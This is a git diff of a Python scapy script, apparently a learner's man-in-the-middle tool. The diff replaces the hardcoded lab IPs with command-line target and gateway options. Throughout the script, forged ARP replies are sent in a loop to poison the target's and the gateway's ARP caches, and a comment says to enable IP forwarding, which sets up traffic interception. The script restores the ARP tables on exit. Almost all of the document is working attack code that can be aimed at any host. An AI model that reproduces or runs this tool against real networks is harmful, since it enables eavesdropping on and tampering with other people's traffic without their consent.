@@ -1,7 +1,15 @@
 import scapy.all as scapy
 import time
+import optparse
 
-# python3 My_Mitm.py
+# echo 1> /proc/sys/net/ipv4/ip_forward      -> you need to do everytime when your comp. start on cmd
+# python3 My_Mitm.py -t 10.0.2.15 -g 10.0.2.1
+
+# -------------------------------------------------------
+# target ip : 10.0.2.15   second machine
+# my ip : 10.0.2.4        current machine
+# modem ip : 10.0.2.1     modem
+# -------------------------------------------------------
 
 # -------------------------------------------------------
 # first you need to write 'echo 1 > /proc/sys/net/ipv4/ip_forward'
@@ -10,6 +18,20 @@ import time
 # op = 1 request   ||   op = 2 response
 # -------------------------------------------------------
 
+def get_user_input():
+    parse_object = optparse.OptionParser()
+    parse_object.add_option("-t", "--target", dest="target_ip", help="Enter Target ip")
+    parse_object.add_option("-g", "--gateway", dest="gateway_ip", help="Enter Gateway ip")
+    # (options, arguments) = parse_object.parse_args()
+    # we wanna get just options
+    # [0] = options    ||    [1] = arguments
+    options = parse_object.parse_args()[0]
+    if not options.target_ip:
+        print("Enter Target IP")
+    if not options.gateway_ip:
+        print("Enter Gateway IP")
+    print(options.target_ip," / / / ", options.gateway_ip)
+    return options
 
 def get_mac_adress(ip):
     arp_request = scapy.ARP(pdst = ip)
@@ -30,7 +52,7 @@ def arp_poisoning(target_ip, poisoned_ip):
     scapy.send(arp_response, verbose=False)     # sending report is false - 'verbose'
 
     # arp_response = scapy.ARP()    # get your Operating System details
-    # scapy.ls(scapy.ARP())           # get info
+    # scapy.ls(scapy.ARP())         # get info
 
 def reset_operation(fooled_ip, gateway_ip):
     fooled_mac = get_mac_adress(fooled_ip)
@@ -39,21 +61,19 @@ def reset_operation(fooled_ip, gateway_ip):
     scapy.send(arp_response, verbose=False, count=6)     # sending report is false - 'verbose'
                                                          # count=6  send package for 6 times
 
-# -------------------------------------------------------
-# target ip : 10.0.2.15   second machine
-# my ip : 10.0.2.4        current machine
-# modem ip : 10.0.2.1     modem
-# -------------------------------------------------------
+user_ips = get_user_input()
+target_ip = user_ips.target_ip
+gateway_ip = user_ips.gateway_ip
 num = 0;
+
 try :
     while True :
-        arp_poisoning("10.0.2.15","10.0.2.1")   # for target
-        arp_poisoning("10.0.2.1","10.0.2.4")    # for modem
+        arp_poisoning(target_ip,gateway_ip)    # for target
+        arp_poisoning(gateway_ip,target_ip)    # for modem
         num += 2
         print("\rsending packets ",end = " "+str(num))
         time.sleep(3)
 except KeyboardInterrupt:
     print("\n Quit and Reset")
-    reset_operation("10.0.2.15","10.0.2.1")
-    reset_operation("10.0.2.1","10.0.2.15")
-
+    reset_operation(target_ip,gateway_ip)
+    reset_operation(gateway_ip,target_ip)
